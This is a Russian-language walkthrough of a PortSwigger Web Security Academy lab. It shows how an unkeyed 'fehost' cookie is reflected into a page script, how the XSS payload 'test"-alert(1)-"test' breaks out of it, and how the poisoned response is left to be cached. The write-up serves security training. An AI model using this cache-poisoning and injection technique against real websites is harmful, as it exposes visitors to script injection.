Перейдем на уязвимый ресурс

Откроем `Proxy` -> `HTTP history` и изучим историю запросов

Увидим, что на корневой странице после выдачи нам куки она дублируется на самой странице
```
GET /
Cookie: session=k4lWcQdsKiVGHg9TemHrF865ACq2omq5; fehost=prod-cache-01
```

А в ответе видим
```
<script>
            data = {"host":"0a8500d90367062c856eb31200ae0046.web-security-academy.net","path":"/","frontend":"prod-cache-01"}
        </script>
```

Поле `prod-cache` есть дубль

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/2.%20Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie/pics%20for%20walkthrough/1.png)

Отправим запрос в `Repeater`

и заменим значение `prod-cache-01` на `test` и увидим, что оно все-таки отображается и на фронте. отлично
```
Cookie: session=k4lWcQdsKiVGHg9TemHrF865ACq2omq5; fehost=test
```
а вот что в ответе
```
       <script>
            data = {"host":"0a8500d90367062c856eb31200ae0046.web-security-academy.net","path":"/","frontend":"test"}
        </script>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/2.%20Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie/pics%20for%20walkthrough/2.png)

Далее воспользуемся XSS уязвимостью, и просто постараемся выйти за скобки 
Для этого значние в fehost изменим на 
```
Cookie: session=k4lWcQdsKiVGHg9TemHrF865ACq2omq5; fehost=test"-alert(1)-"test
```
И в ответе получим 
```
<script>
            data = {"host":"0a8500d90367062c856eb31200ae0046.web-security-academy.net","path":"/","frontend":"test"-alert(1)-"test"}
</script>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/2.%20Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie/pics%20for%20walkthrough/4.png)

Дождемся `X-Cache: hit` и получим уведомление об успешно выполненной лабораторной работе
